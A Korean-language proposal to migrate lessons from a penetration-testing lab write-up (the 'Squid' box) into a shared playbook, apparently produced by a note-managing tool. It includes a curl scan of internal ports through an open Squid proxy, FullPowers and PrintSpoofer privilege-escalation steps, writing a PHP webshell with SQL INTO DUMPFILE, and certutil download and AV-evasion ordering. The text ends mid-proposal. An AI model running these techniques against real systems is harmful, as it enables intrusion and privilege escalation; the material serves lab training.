# Squid → _PLAYBOOK 이관 제안

작성자: pg-note-forge. `_PLAYBOOK.md` 는 직접 쓰지 않음 — 아래 제안을 `pg-line-manager` 가 반영.
개작 전 원문 백업: `03. PG\_backup\Squid.md.bak`(1062행, 구 0~9장 구조).

검산(감사 후 갱신): 제안 **13건 — 신규 2 · 병합 11**(그중 1건은 기존 스텁 정정 포함).

⚠️ 초판은 「11건 = 신규 3 · 병합 8 · 이관 손실 0」으로 적었으나 감사에서 **둘 다 틀렸음**이 확인됨:
- **분류 오류** — 초판 11건을 세면 신규는 제안 1·11 **2건**뿐이고 나머지 9건이 병합임. `_PLAYBOOK` 의 `### B-7` 절에 B-71 하나뿐임을 확인해 제안 1 의 신규 판정은 유지, 제안 11(D절)도 신규 유지.
- **이관 손실 3건** — 아래 제안 12·13 과 제안 1 의 「503 판별 3가지」 단락이 노트에서도 제안서에서도 빠져 있었음. 보충함.

---

## 제안 1 — B-7(피벗·터널링), 신규

**① 위치**: `### B-7. 피벗·터널링` 절 끝(B-71 다음), 번호는 관리자가 배정(가칭 `B-72`)
**② 신규**
**③ 넣을 본문**:

```markdown
#### B-72. 오픈 프록시로 셸 없이 내부 포트 열거

**외부 웹 포트가 하나(포워드 프록시)뿐이면 그 자체가 공격면이 아니라 통로일 수 있음.** 프록시가 여는 연결은 내부→내부(127.0.0.1→127.0.0.1)라 방화벽이 로컬 트래픽으로 보고 규칙을 적용 안 함 — 오픈 프록시 하나로 "외부 노출 1포트"가 "내부 전 포트 접근"으로 뒤집힘.

**판별은 응답 코드로.** Squid 기준(다른 프록시도 원리는 같음):

| 응답 | 의미 |
|---|---|
| `503` + `ERR_CONNECT_FAIL` | 연결 실패(닫힘 — 루프백 대상이면 필터링 여지가 없어 실질적으로 닫힘) |
| `403` + `ERR_ACCESS_DENIED` | ACL 차단(`Safe_ports` 등) — 개폐 판별 불가, "안 나왔다"이지 "닫혔다"가 아님 |
| 그 외 | 열림 |

```bash
P=$1
R=$(curl -s -o /dev/null -m 8 -w '%{http_code}' -x http://<타겟>:<프록시포트> http://127.0.0.1:$P/ 2>/dev/null)
[ "$R" != "503" ] && [ "$R" != "000" ] && echo "PORT $P -> HTTP $R"
```
전 포트를 이렇게 훑고 503/000 을 걸러낸 결과만 모을 것. `-m`(타임아웃)은 필수 — 필터링된 포트는 응답이 영영 안 옴.

⚠️ **503 하나로 「닫힘」을 단정하지 말 것 — Squid 는 `connect()` 실패를 원인별로 구분하지 않음.** refused(RST)든 timeout(필터링)이든 똑같이 `ERR_CONNECT_FAIL` 임. 가르는 판별자는 셋:
1. **본문 `The system returned:` 줄** — `(111) Connection refused`(닫힘) vs `(110) Connection timed out`(필터링). Squid 가 errno 를 노출하는 유일한 지점
2. **응답 지연** — refused 는 즉시, 필터링은 `connect_timeout`(기본 1분) 대기
3. **`ERR_READ_TIMEOUT`** 이 뜨면 핸드셰이크는 성공한 것 = **포트 열림**. 스캔에서는 오히려 강한 양성 신호

상태 코드도 항상 503 은 아님 — connect 타이머는 504, 피어 응답 불량은 502 로 갈림. **목적지가 `127.0.0.1` 일 때만 「503=닫힘」이 실질적으로 성립함**(루프백에는 필터링이 끼어들 여지가 없음). 외부 IP 대상 스캔에 그대로 옮기면 틀림.
```bash
curl -s -D - -o /dev/null -x http://<타겟>:<프록시포트> http://127.0.0.1:9999/ | grep -i squid-error
```

목적지는 항상 `127.0.0.1`(타겟 자신의 루프백) — 서비스가 `0.0.0.0` 이 아니라 루프백 전용 바인드면(MySQL·WinRM 기본 구성에서 흔함) 외부 IP 로는 안 붙고 이 경로로만 붙음. `localhost` 도 병행 시도.

**비-HTTP 서비스 배너도 샘.** Squid 는 응답 첫 줄이 `HTTP/x.x` 가 아니면 HTTP/0.9 본문으로 간주해 그대로 전달함 — MySQL·SMTP·FTP·Redis 배너가 `X-Transformed-From: HTTP/0.9` 헤더와 함께 그대로 새어 나옴.

**`CONNECT` 가능 여부를 먼저 확인할 것.** 열리면 프록시가 범용 TCP 터널이 되어 `proxychains` 로 nmap·evil-winrm·mysql 클라이언트를 그대로 밀어 넣을 수 있음. 막혀 있으면 HTTP 로 표현 가능한 공격만 남음:
```bash
curl -v -x http://<타겟>:<포트> https://example.com/
```

**커버리지 한계는 정직하게 기록할 것.** Squid `Safe_ports` ACL(기본 21,70,80,210,280,443,488,591,777,1025-65535) 밖의 1024 이하 포트는 전부 403 이라 개폐 판별 자체가 불가능함. "스캔했는데 안 나왔다"와 "스캔할 수 없었다"를 구분해 보고서에 적을 것 — 안 적으면 오탐/미탐 책임이 커짐.

**셸을 잡은 뒤 `ss -lntp`/`netstat -ano` 로 보는 내부 리슨 포트도 같은 계열임**(A-44) — 이 카드는 «셸 없이», A-44 는 «셸 잡은 뒤»의 같은 사고.

**출처** — [[Squid]](Squid 4.14 오픈 프록시, 3128 하나로 3306·5985·8080·47001 를 발견).
```

**④ 지우기 전 원문** (구 §1-2, §1-1 일부, §2-1·§2-2 일부):

> Squid는 `http://127.0.0.1:<포트>/` 요청을 그대로 중계한다. 응답 코드로 내부 포트의 개폐를 판별할 수 있다.
>
> | 응답 | 의미 |
> |---|---|
> | `503` + `X-Squid-Error: ERR_CONNECT_FAIL` | 내부 포트 연결 실패 — 닫힘(RST) 또는 필터링(§2-2 참조). 루프백 대상에서는 실질적으로 닫힘 |
> | `403` + `ERR_ACCESS_DENIED` | Squid Safe_ports ACL이 차단 — 개폐 판별 불가 |
> | 그 외 (200/400/404/405…) | 내부 포트 열림 |
>
> (pscan.sh/psweep.sh 스크립트 전문 — 본문에 보존됨)
>
> 프록시 열거의 한계는 정직하게 기록해 둔다. Squid의 `Safe_ports` ACL(21,70,80,210,280,443,488,591,777 및 1025-65535) 밖의 1024 이하 포트는 전부 403이라 개폐를 판별할 수 없다(허용 하한이 1025이므로 차단 경계는 "1025 미만"=1024 이하다). 실측: `proxyscan.txt`에서 403 응답 포트의 최댓값이 정확히 1024, 403 총 개수는 1015 = (1..1024) 1024개 − Safe_ports 9개로 산수까지 맞는다. `CONNECT`는 443 외 전부 차단됐고(...), 443에는 서비스가 없어 실질적으로 범용 터널이 불가능했다. cache manager(`/squid-internal-mgr/info`)도 403이라 설정 덤프도 불가능하다. **"스캔했는데 안 나왔다"와 "스캔할 수 없었다"는 다르다.**
>
> MySQL 배너도 프록시를 통해 그대로 샌다 (HTTP/0.9로 감싸져 나온다): ... Squid는 응답 첫 줄이 `HTTP/x.x`가 아니면 HTTP/0.9 본문으로 간주해 그대로 전달한다 ... 그래서 HTTP 프록시만으로 비-HTTP 서비스의 배너를 딸 수 있다 — SMTP·FTP·Redis 배너도 같은 방식으로 샌다.

---

## 제안 2 — B-42, 병합

**① 위치**: `#### B-42. 특권은 "없는" 게 아니라 "박탈된" 것일 수 있다` (현재 1줄짜리 스텁)
**② 병합** — 스텁을 아래로 교체/확장
**③ 넣을 본문**:

```markdown
#### B-42. 특권은 "없는" 게 아니라 "박탈된" 것일 수 있다

`whoami /priv` 에 `SeImpersonatePrivilege` 가 없어도 포기하지 말 것 — 계정이 `LOCAL SERVICE`/`NETWORK SERVICE` 라면 원래 그 특권을 보유하지만 **서비스 최소특권 모델**(Vista 이후)이 서비스 기동 시 `RequiredPrivileges` 선언 외 특권을 SCM 이 토큰에서 제거함. 서비스의 자식 프로세스(웹셸 등)는 그 깎인 토큰을 그대로 상속.

**FullPowers 원리** — SCM 을 우회해 같은 계정의 온전한 기본 토큰을 새로 얻음:
1. 작업 스케줄러(Task Scheduler 2.0 COM API)로 같은 계정의 예약 작업을 등록
2. 작업 스케줄러는 서비스가 아니므로 `RequiredPrivileges` 축소가 적용 안 됨 → 그 프로세스는 계정의 **기본 특권 전체**를 가진 토큰으로 뜸
3. 그 토큰을 복제(`DuplicateTokenEx`)해 `CreateProcessAsUser` 로 원하는 명령 실행
4. 예약 작업은 즉시 삭제

```powershell
fp.exe -c "cmd /c whoami /priv > C:\out.txt 2>&1" -z
[+] Started dummy thread with id 960
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
```
3개(`SeChangeNotify`·`SeCreateGlobal`·`SeIncreaseWorkingSet`) → 7개, `SeImpersonatePrivilege` 포함. **개수가 아니라 목록에 위험 특권이 있는지로 판단할 것.**

**출력이 안 보이면 파일로 리다이렉트할 것.** `CreateProcessAsUser` 로 만든 프로세스는 원래 콘솔과 분리돼 화면에 아무것도 안 나옴 — `-c "cmd /c <명령> > C:\out.txt 2>&1"` 로 감싸고 따로 `type` 할 것. 웹셸·예약작업·서비스·`CreateProcessAsUser` 로 만든 모든 프로세스가 같은 증상.

**판단 순서** — `whoami /priv` 가 빈약할 때:
```text
whoami 가 LOCAL SERVICE/NETWORK SERVICE 인가?
  └─ 예 ──→ FullPowers 로 복원 시도 (1순위)
  └─ 아니오 ──→ 다른 경로(서비스 오설정·AlwaysInstallElevated·언쿼티드 경로…)
```
`whoami /priv` 가 빈약하다고 바로 서비스 오설정·레지스트리를 뒤지기 시작하면 여기서 몇 시간이 날아감 — **계정이 `LOCAL/NETWORK SERVICE` 면 FullPowers 가 1순위.**

**출처** — [[Squid]](WampServer/Apache LOCAL SERVICE 웹셸, 3개→7개 복원 후 PrintSpoofer 로 SYSTEM).
```

**④ 지우기 전 원문** (구 §2-8·§4-3 일부):

> 원인은 Windows Vista 이후의 "서비스 최소 특권(least-privilege services)" 모델이다. 서비스 제어 관리자(SCM)는 서비스를 기동할 때, 서비스가 레지스트리의 `RequiredPrivileges` 값으로 선언한 특권 외에는 토큰에서 제거한 채 프로세스를 만든다. 즉 계정의 특권 ≠ 프로세스 토큰의 특권이다. WampServer의 Apache 서비스는 필요한 것만 선언했고, 그 자식으로 태어난 우리 웹셸은 깎인 토큰을 그대로 상속받았다.
>
> FullPowers의 원리 — SCM을 우회해서 같은 계정의 온전한 기본 토큰을 새로 얻는다: ① 작업 스케줄러(내부적으로 Task Scheduler 2.0 COM API `ITaskService`)로 "NT AUTHORITY\LOCAL SERVICE" 예약 작업을 등록한다 ② 작업 스케줄러는 서비스가 아니므로 RequiredPrivileges 축소를 적용하지 않는다 → 그 프로세스는 LOCAL SERVICE의 **기본 특권 전체**를 가진 토큰으로 뜬다 ③ 그 토큰을 복제해서(DuplicateTokenEx) CreateProcessAsUser로 원하는 명령을 실행한다 ④ 예약 작업은 즉시 삭제한다
>
> `whoami /priv`에 `SeImpersonatePrivilege`가 없으면 대부분 "Potato 경로는 없다"고 판단하고 다른 곳을 뒤진다 — 그게 함정이다. 판정 기준은 `whoami`가 `nt authority\local service` 또는 `nt authority\network service`인가다.
>
> (§4-3 원문: fp.exe 실행 로그 4줄, before/after 특권 표 — 본문에 보존됨)
>
> ### ⑦ 새 프로세스의 출력이 안 보인다
> `fp.exe -c "whoami /priv"`를 실행하면 **화면에 아무것도 안 나온다.** `CreateProcessAsUser`로 만든 프로세스는 우리 웹셸과 콘솔이 분리돼 있기 때문이다. 해결: `-c "cmd /c whoami /priv > C:\Users\Public\priv_after.txt 2>&1"` 처럼 **파일로 리다이렉트**하고 따로 읽는다.

---

## 제안 3 — B-46, 병합

**① 위치**: `#### B-46. SeImpersonatePrivilege : Enabled + Spooler 생존 → PrintSpoofer`
**② 병합** — 기존 Nagoya 사례 뒤에 빌드별 Potato 비교표 추가
**③ 넣을 본문** (기존 내용 유지, 아래를 "출처" 앞에 추가):

```markdown
**Potato 계열은 빌드로 먼저 걸러질 것.** ②단계(누구를 어떻게 속이는가)만 다름:

| 이름 | 유인 방법 | Server 2019(build 17763)+ |
|---|---|---|
| RottenPotato/JuicyPotato | DCOM OXID 리졸버를 임의 로컬 포트로 유도 | ❌ 죽음 — 1809부터 OXID를 135 외 포트로 질의 불가 |
| RoguePotato | OXID 리졸버를 외부 135 릴레이로 우회 | ✅ 단 아웃바운드 135 필요 |
| **PrintSpoofer** | Spooler RPC 로 `spoolsv.exe`(SYSTEM)를 명명 파이프에 유인 | ✅ Spooler 가동 중이면 |
| EfsPotato/GodPotato | EFSRPC/DCOM 범용 변형 | ✅ Spooler 꺼져 있어도 됨 |

build 17763(Server 2019/Win10 1809) 확인 즉시 JuicyPotato 는 배제하고 PrintSpoofer→EfsPotato/GodPotato→RoguePotato 순으로 시도할 것. 빌드는 `systeminfo` 접근이 막혀도 phpSysInfo·SMB 배너 등 비특권 경로로도 확인 가능함([[Squid]] 는 phpSysInfo `Kernel="10.0.17763"`).

**출처** — [[Nagoya]](xp_cmdshell 경유) · [[Squid]](웹셸 경유, build 17763 확인 후 PrintSpoofer 직행).
```

**④ 지우기 전 원문** (구 §2-7 표):

> | 이름 | ② 유인 방법 | 동작 조건 | Server 2019(build 17763) |
> |---|---|---|---|
> | Hot Potato | NBNS 스푸핑 + WPAD + NTLM 릴레이 | 구버전 Windows | ❌ |
> | RottenPotato / JuicyPotato | DCOM으로 SYSTEM 서비스가 우리 COM 리스너에 인증 | OXID 리졸버를 임의 로컬 포트로 유도 가능해야 함 | ❌ 죽었다 (1809부터 OXID를 135 외 포트로 질의 불가) |
> | RoguePotato | OXID 리졸버를 외부 135 릴레이로 우회 | 아웃바운드 135 필요 | ✅ |
> | **PrintSpoofer** | Print Spooler RPC로 spoolsv.exe(SYSTEM)를 우리 명명 파이프에 접속시킴 | Spooler 서비스 실행 중 | ✅ ← 이 박스 |
> | EfsPotato / SharpEfsPotato | EFSRPC(`lsarpc` 파이프) 유인 | Spooler 꺼져 있어도 됨 | ✅ |
> | GodPotato | DCOM/RPC 범용 변형 | 광범위 | ✅ |
>
> build 17763은 권한상승 경로를 여기서 이미 좁혀준다. Windows 10 1809 / Server 2019 = build 17763. 이 빌드부터 JuicyPotato가 죽었다 — 1809부터 OXID 리졸버를 135 외 포트로 질의할 수 없게 되어 JuicyPotato의 로컬 포트 리디렉트(`-l <port>`)가 막혔다.

---

## 제안 4 — B-81, 병합

**① 위치**: `#### B-81. 페이로드는 base64로 감싼다` (SQL hex 리터럴 단락)
**② 병합** — `INTO DUMPFILE`/`OUTFILE` Errcode 세부를 추가
**③ 넣을 본문** (기존 hex 리터럴 단락 뒤에 추가):

```markdown
**`INTO DUMPFILE` vs `INTO OUTFILE` — 바이너리·정확한 바이트열이면 `DUMPFILE`.** `OUTFILE` 은 열/행 구분자를 삽입하고 특수문자를 이스케이프해 바이너리를 깨뜨림. `DUMPFILE` 은 단일 행을 가공 없이 그대로 씀.

⚠️ **둘 다 기존 파일을 덮어쓰지 않음** — 대상이 이미 있으면 `Errcode: 17 - File exists` 로 실패함. 같은 파일명으로 재시도하며 헤매지 말고 **파일명을 바꿀 것**(권한 문제로 오진하기 쉬운 지점). 대상 디렉터리에 mysqld 계정 쓰기 권한이 없으면 `Errcode: 13`.

**출처** — [[Squid]](`SELECT 0x... INTO DUMPFILE 'C:/wamp/www/sh.php'`, WampServer/Apache 웹루트).
```

**④ 지우기 전 원문** (구 §2-5·§3):

> `INTO OUTFILE` vs `INTO DUMPFILE` — 이 구분은 필수다: (표 — 대상/가공/용도 3행, 본문에 보존됨) `OUTFILE`로 웹셸을 쓰면 백슬래시가 `\\`로 부풀고 개행이 끼어들어 PHP 문법이 깨질 수 있다. 특히 `.exe`·`.dll` 같은 바이너리는 100% 망가진다. 두 구문 모두 **기존 파일을 덮어쓰지 않는다.** 대상 파일이 이미 존재하면 `Errcode: 17 - File exists`로 실패한다. 같은 이름으로 재시도하며 헤매지 말고 파일명을 바꿔라. 이것 때문에 "권한 문제"로 오진하고 시간을 태우는 경우가 많다.
> (⑨ 표 행: `INTO DUMPFILE`이 `Errcode: 13` | 대상 디렉터리에 mysqld 계정 쓰기 권한 없음 | 다른 경로 시도... / `Errcode: 17` | 파일이 이미 존재 | 덮어쓰기 불가. 파일명을 바꾼다)

---

## 제안 5 — B-82, 병합 + 기존 스텁 정정 (중요)

**① 위치**: `#### B-82. 파일 전송 후 ls/md5sum으로 확인한다`
**② 병합 — 단 기존 스텁 자체가 틀렸으므로 «교체» 필요**

⚠️ **기존 스텁 "유명 도구는 파일명만으로 삭제됨. ([[Squid]] [[Exghost]])" 은 Squid 노트의 개작 전 버전(구 §6①)을 근거로 한 것인데, 그 구버전 자체가 자기모순으로 이미 틀렸던 서술임.** 개작 과정에서 원인을 재검토해 반증했음 — AV 파일명 탐지가 아니라 `certutil` 의 상대경로 조용한 실패였음. `[[Exghost]]` 근거는 별개 박스라 확인하지 않았음(그쪽은 그대로 유효할 수 있음) — **Squid 쪽 근거만 교체가 필요.**

**③ 넣을 본문** (교체안):

```markdown
#### B-82. 파일 전송 후 ls/md5sum으로 확인한다

**다운로드 "성공" 메시지를 믿지 말 것 — 경로 문제로 조용히 실패해도 성공 배너를 냄.** [[Squid]] — `certutil -urlcache -f <URL> PrintSpoofer64.exe`(상대경로) 가 `CertUtil: -URLCache command completed successfully.` 를 반환했는데 `dir` 로 확인하니 파일이 없었음.

⚠️ **처음엔 "AV 가 파일명 시그니처로 탐지했다"로 오진했으나 반증됨:**
- Defender 에 "파일명 시그니처" 탐지 기전 자체가 없음(내용·행위·ML 기반, 파일명은 *제외 목록*에서만 쓰임)
- 관측된 `RealTimeProtectionEnabled=False` 는 애초에 쓰기 시점 스캔이 없었다는 뜻이라 자기 결론을 반박함
- PrintSpoofer 는 실제로 내용 기반(`HackTool:Win64/PrintSpoofer!MTB`)으로 탐지되는 도구라, 내용 기반이면 이름만 바꿔서는 회피 안 됨
- `[가정]` **남은 유력 원인** — `certutil -urlcache -f` 는 대상 경로에 쓸 수 없을 때도 "완료" 배너와 exit 0 을 반환함(URL 캐시 표시 모드로 조용히 떨어짐). 웹셸 컨텍스트의 CWD 는 대개 쓰기 불가라 상대 파일명이 사라진 것
- ⚠️ **다만 이것도 확증은 아님** — 산출물은 **파일명 변경과 절대경로 지정이 동시에** 일어났음만 보여줌. 「이름을 바꾸니 됐다」를 인과로 읽은 것이 원래 오류였는데, 「절대경로라서 됐다」도 같은 자리에서 같은 방식으로 단정하면 오류가 방향만 바뀜. **확정된 것은 AV 파일명 이론의 반증까지**임

**전송 후 체크리스트:**
```cmd
dir C:\Users\Public\fp.exe
certutil -hashfile C:\Users\Public\fp.exe MD5
```

**회피 순서(경로 → 파일명 → 전송수단 → 페이로드)**:
1. **쓰기 가능한 절대경로 지정**(`C:\Users\Public\ps.exe`) ← 대개 여기서 해결됨
2. 파일명 변경 — 내용 기반 탐지에는 무력하지만 가장 쌈
3. 전송 경로 변경(`C:\Windows\Temp\`·`%APPDATA%`)
4. 전송 수단 변경(`certutil`→`iwr`→SMB 마운트)
5. 페이로드 자체 변경

받아오는 방향도 같음 — 바이너리를 HTTP 로 받으면 `-o` 저장 → `file` → `md5sum` 순서를 습관으로. `file` 출력이 「내용이 실제로 들어 있다」까지 알려줌([[Fanatastic]] `grafana.db` 0페이지 사례).

⚠️ **여기서 md5 가 하는 일은 「Kali 원본 ↔ 타겟 사본의 동일성 확인」 하나뿐임** — 「이 exe 가 어느 페이로드인가」를 md5 로 가르려 들면 안 됨(B-88).

**⛔ 이미지 «재인코딩» 경로는 EXIF 페이로드를 조용히 파괴함** — [[Exfiltrated]] 참조(원문 유지, 본문에 보존됨).

**출처** — [[Squid]](certutil 상대경로 실패, AV 이론 반증) · [[Exfiltrated]](이미지 재인코딩 파괴).
```

**④ 지우기 전 원문**:

기존 스텁(정정 대상):
> **유명 도구는 파일명만으로 삭제됨.** ([[Squid]] [[Exghost]])

Squid 노트 구 §6① 전체(정정 근거):
> **"성공"이라고 뜨는데 파일이 없다.** 이름을 바꾸면서 **절대경로**(`C:\Users\Public\ps.exe`)를 함께 준 뒤에야 정상 저장됐다.
> 진짜 원인은 AV가 아니라 `certutil`의 조용한 실패였다. 당시 이 실패를 "파일명 시그니처 탐지"로 적었으나, 이는 오귀인이다. 근거:
> - Defender에 "파일명 시그니처"라는 탐지 기전은 **없다**(탐지는 내용·행위·ML 기반, 파일명은 *제외 목록*에서만 쓰인다). 게다가 관측된 `RealTimeProtectionEnabled=False`는 쓰기 시점 스캔이 일어나지 않았다는 뜻이라 자기 결론을 반박한다.
> - PrintSpoofer는 실제로 내용 기반으로 탐지된다(`HackTool:Win64/PrintSpoofer!MTB`). 내용 기반이면 이름만 바꿔서는 회피되지 않는다 — "이름을 바꾸니 됐다"는 인과가 아니라 상관이었다.
> - `certutil -urlcache -f`는 **대상 경로에 쓸 수 없을 때도 "완료" 배너와 exit 0을 반환**한다 ... **이름 변경이 아니라 절대경로 지정이 실제 해결**이었다.
> - 진짜 HTTP 실패는 시끄럽다 — 404는 `0x80190194 (HTTP_E_STATUS_NOT_FOUND)`에 음수 exit로 떨어진다.
> (체크리스트·회피 순서 5단계 — 본문에 보존됨)

---

## 제안 6 — A-12, 병합

**① 위치**: `#### A-12. 응답이 성공을 뜻하지 않는다`
**② 병합**
**③ 넣을 본문** (기존 항목들 뒤에 한 단락 추가):

```markdown
**Windows 판 — 다운로드 도구의 "성공"도 마찬가지임.** [[Squid]]: `certutil -urlcache -f` 가 상대경로 쓰기 실패에도 성공 배너 + exit 0 을 반환. 상세·회피 순서는 B-82.
```

**④ 지우기 전 원문**: 위 제안 5 의 ④ 와 동일(구 §6①). 중복 인용은 생략.

---

## 제안 7 — B-1-14, 병합

**① 위치**: `#### B-1-14. CSRF 벽은 토큰을 실시간 파싱해 넘는다`
**② 병합** — phpMyAdmin 사례를 ZoneMinder 사례 옆에 추가
**③ 넣을 본문** (기존 "출처" 줄을 아래로 교체):

```markdown
**phpMyAdmin 도 같은 함정** — 요청마다 `token` 이 갱신됨. 로그인 페이지에서 뽑은 토큰을 다음 요청(`import.php` 등)에 그대로 재사용하면 **에러 없이 로그인 페이지로 조용히 되돌아옴** — "실행됐는데 결과가 없다"처럼 보임. 해결은 동일 — 로그인 응답 본문에서 새 토큰을 다시 파싱해 씀. `requests.Session()` + `trust_env=False`(환경변수 프록시가 끼어드는 것 방지)를 같이 쓸 것.

**출처** — [[CVE-2023-46818]](ZoneMinder) · [[Squid]](phpMyAdmin 5.0.2, 프록시 경유 자동화).
```

**④ 지우기 전 원문** (구 §3·§6⑤):

> phpMyAdmin은 요청마다 토큰이 갱신된다. 로그인 응답에서 새 토큰을 다시 뽑아야 SQL이 실행된다. `trust_env = False`를 빼면 조용히 엉뚱한 곳으로 나간다. ...
> ### ⑤ phpMyAdmin 토큰 갱신 — 첫 SQL이 조용히 실패했다
> phpMyAdmin은 CSRF 방지를 위해 **요청마다 `token`을 갱신**한다. 로그인 페이지에서 뽑은 토큰을 그대로 `import.php`에 재사용하면 **에러 없이 로그인 페이지로 되돌아온다** — "실행됐는데 결과가 없다"처럼 보인다. 해결: **로그인 응답 본문에서 새 토큰을 다시 파싱**해서 그 다음 요청에 쓴다.
> 웹앱 자동화의 3대 함정은 다음이다. 1. CSRF 토큰이 매 요청 갱신 2. 세션 쿠키를 유지하지 않음 3. 환경변수 프록시가 끼어듦

---

## 제안 8 — A-16, 병합

**① 위치**: `#### A-16. 워드리스트 열거가 전부 공전한다`
**② 병합**
**③ 넣을 본문** (기존 사례들 뒤에 추가):

```markdown
**프록시 경유 브루트는 300초 제한에 걸려 미완주할 수 있음 — 그때는 열거 «방식» 자체를 바꿀 것.** [[Squid]] — 22만 라인 워드리스트를 Squid 프록시로 밀었더니 요청당 수백 ms 지연으로 300초 안에 완주 못 함. 홈페이지가 이미 `Your Aliases: adminer phpmyadmin phpsysinfo` 를 알려줬으므로 무차별 대신 타겟형 프로브로 전환하니 전부 한 번에 적중. **홈페이지·`robots.txt`·JS 번들·에러 페이지가 경로를 직접 알려주는 경우가 무차별 열거보다 훨씬 흔함.** 프록시·VPN 경유로 느린 링크에서는 워드리스트를 `common.txt` 급으로 줄이거나 아예 타겟형으로 전환할 것.
```

**④ 지우기 전 원문** (구 §6③):

> `directory-list-2.3-medium.txt`(22만 라인)를 프록시로 밀었더니 300초 제한에 걸려 **미완주**했다. 프록시 왕복이 요청당 수백 ms라 대규모 워드리스트는 구조적으로 불가능하다.
> **탈출구는 열거 방식 전환이었다.** WampServer 홈페이지가 이미 `Your Aliases: adminer phpmyadmin phpsysinfo`를 알려줬으므로, 무차별 열거 대신 타겟형 프로브로 바꾸니 `/adminer`·`/phpsysinfo`·`/wampthemes`·`/testmysql.php`가 전부 한 번에 적중했다.
> 무차별 디렉터리 열거는 정보가 없을 때의 최후 수단이다. 홈페이지·`robots.txt`·JS 번들·에러 페이지·`sitemap.xml`이 경로를 직접 알려주는 경우가 훨씬 흔하다.

---

## 제안 9 — A-4x(Windows 블로킹 명령/Monster 항목), 병합

**① 위치**: A-4 절, "「없다」를 확인하는 데 드는 시간을 얕보지 말 것"([[Monster]] `Get-ChildItem -Recurse` 7분) 단락
**② 병합**
**③ 넣을 본문** (해당 단락 뒤에 추가):

```markdown
**같은 증상의 다른 데이터 포인트** — [[Squid]]: `Get-ChildItem C:\ -Recurse` 로 `local.txt` 를 찾으려다 리버스셸이 수 분간 무응답. `dir C:\` 한 번(플래그가 `C:\local.txt` 비표준 위치)으로 즉시 발견. 더 빠른 대안:
```cmd
dir C:\ /b
where /r C:\ local.txt
cmd /c dir C:\*.txt /s /b 2>nul
```
`C:\Users\*\Desktop\local.txt` 패턴만 찾으면 일반 유저 계정이 없는 박스에서 영원히 못 찾음 — `dir C:\` 로 비표준 위치부터 먼저 확인할 것.
```

**④ 지우기 전 원문** (구 §6⑧):

> `C:\Users\*\Desktop\local.txt`를 찾다가 실패했다. 일반 유저 계정 자체가 없었기 때문이다. `Get-ChildItem C:\ -Recurse`로 전체 탐색을 시도했더니 **리버스셸이 몇 분간 응답 없이 멈췄다.** `dir C:\` 한 번으로 끝났다.
> ```cmd
> dir C:\ /b
> where /r C:\ local.txt
> cmd /c dir C:\*.txt /s /b 2>nul
> ```

---

## 제안 10 — A-31, 병합

**① 위치**: `#### A-31. 리버스셸이 안 붙는다`(443→80→53 포트 교체 사례 모음)
**② 병합**
**③ 넣을 본문**:

```markdown
[가정] [[Squid]] — 리버스셸 포트를 443→4444 로 바꾼 흔적이 mtime 에 남음: `revgen.py`(LHOST:PORT=192.168.45.207:**443**, 18:32) → FullPowers 다운로드(18:36) → `revgen4444.py`(…:**4444**, 18:38). 443 시도의 성공·실패 로그 자체는 노트·Kali 어디에도 없어 "왜 바꿨는지"는 mtime 순서로만 추정 가능함(직접 관측 아님). 최종 성공 리버스셸이 4444 인 것과는 일치.
```

**④ 지우기 전 원문** (구 §6⑨ 일부):

> [가정] 리버스셸 포트를 443 → 4444로 바꾼 흔적이 있다 ... 산출물 타임라인이 이 마찰을 실제로 겪었을 가능성을 시사한다: `revgen.py`(LHOST:PORT=192.168.45.207:**443**, Aug19 18:32) → FullPowers 다운로드(18:36) → `revgen4444.py`(…:**4444**, 18:38). 443으로 먼저 만들었다가 4444로 바꾼 순서다. 443 시도의 결과 기록은 노트·Kali 어디에도 없어 왜 바꿨는지는 확증할 수 없다(타임스탬프 기반 추론). 최종 성공 리버스셸이 4444인 것과는 일치한다.

---

## 제안 11 — D절(시간 배분), 신규

**① 위치**: `## D. 시간 배분 · 손절 기준`, [[Robust]] 실측 항목 뒤
**② 신규**(과업 지시로 받은 mtime 사실 기반 — 원 노트에 이런 정리가 없었으므로 ④ 원문 인용 없음. 삭제한 것이 아니라 새로 계산한 것)
**③ 넣을 본문**:

```markdown
실측([[Squid]]) — `~/PG/Squid/` mtime 재구성(2026-08-19). `pscan.sh` 18:23 → nmap 3종 18:25 → 프록시 내부 포트 열거·gobuster 18:25~18:28(**3분**) → phpMyAdmin 익스플로잇·웹셸(`pma.py`·`sh.php`) 18:30 → 웹셸 확인(`web.sh`) 18:31 → 권한상승 페이로드 준비(`revgen.py`→FullPowers 다운로드→`revgen4444.py`) 18:32~18:38(**6분**, 443→4444 포트 전환 포함). 첫 스크립트~마지막 산출물 = **15분.** 정찰~내부 포트 확정이 5분 안, DB 접근~웹셸이 3분 안으로 가장 빠른 구간이었고, 권한상승 페이로드 준비(포트 전환 포함)가 가장 긴 6분 구간이었음.
```

---

---

## 제안 12 — B-2-12, 병합 (감사에서 «이관 손실»로 잡혀 추가)

**① 위치**: `#### B-2-12. 번들 스택의 구성요소가 «돈다»고 가정하지 말 것`
**② 병합**
**③ 넣을 본문**:

```markdown
[[Squid]] — WampServer 홈페이지가 `MariaDB Version: 10.4.13 - Port defined for MariaDB: 3307` 을 렌더했으나 **3307 은 실제로 미기동**. 프록시 포트 스윕 산출물(`proxyscan.txt`)에 3307 라인이 아예 없는 것이 근거임 — 그 스크립트는 503·000 을 출력에서 제외하므로 **부재 = 연결 실패**. 같은 스택의 MySQL 5.7.31(3306)만 살아 있었음.

**설정 파일·상태 페이지가 말하는 것은 「의도」이지 「현실」이 아님.** 번들 스택(WampServer·XAMPP·LAMP 어플라이언스)은 구성요소를 다 선언해 놓고 일부만 기동하는 것이 정상 동작임 — 선언된 포트를 봤으면 반드시 실측으로 개폐를 확인할 것.
```

**④ 지우기 전 원문** (구 §6④):

> WampServer 홈페이지가 `MariaDB Version: 10.4.13 - Port defined for MariaDB: 3307`이라고 렌더했지만, 실제 3307은 **503(닫힘)** 이었다.
> **교훈**: 설정 파일·상태 페이지가 말하는 것은 **의도**이지 **현실**이 아니다. 반드시 실측한다. ([[Hawat]]의 "소스와 배포본이 다르다"와 같은 계열의 함정이다.)

---

## 제안 13 — A-2-27, 병합 (감사에서 «이관 손실»로 잡혀 추가)

**① 위치**: `#### A-2-27. 「확인 후 폐기한 벡터」를 표로 남길 것 — 배제 목록이 다음 사람의 지도다`
**② 병합**
**③ 넣을 본문**:

```markdown
